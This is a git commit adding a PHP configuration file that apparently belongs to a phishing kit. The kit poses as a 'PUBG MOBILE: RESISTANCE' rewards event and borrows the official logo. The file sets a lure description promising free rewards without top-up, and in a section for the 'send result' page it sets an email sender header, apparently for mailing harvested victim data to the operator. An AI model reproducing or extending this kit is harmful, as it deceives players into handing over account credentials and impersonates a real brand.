696b8d9de77f9f5b5fb8b14e7ed124c64e2b6acf
7amady100 <75930823+7amady100@users.noreply.github.com>
2021-10-20 17:16:18 +0200

    Add files via upload

---
+++ system/setting.php
@@ -0,0 +1,20 @@
+<?php
+// KONTROL UNTUK MENDAPATKAN ZONA WAKTU (JAKARTA)
+date_default_timezone_set('Asia/Jakarta');
+$jamasuk = date('l, d-m-Y h:i:s');
+
+// KONTROL UNTUK MENDAPATKAN INFORMASI TAHUN SAAT INI (UNTUK DITAMPILKAN DIBAGIAN FOOTER HALAMAN)
+$yearNow = date('Y');
+
+// KONTROL UNTUK DESKRIPSI HALAMAN
+$title = 'PUBG MOBILE: RESISTANCE';
+$description = 'Collect your special rewards at the PUBG MOBILE: RESISTANCE event. This opportunity is limited and without the need for topup. Collect your rewards now!';
+$copyright = 'PUBG MOBILE';
+$theme = '#000';
+$image = 'https://www.pubgmobile.com/common/images/icon_logo.jpg';
+$icon = 'https://www.pubgmobile.com/common/images/icon_logo.jpg';
+
+// KONTROL UNTUK HALAMAN KIRIM RESULT
+$author = '';
+$sender = 'From: BRAVE IN HERE <sendgrid.me@gmail.com>';
+?>
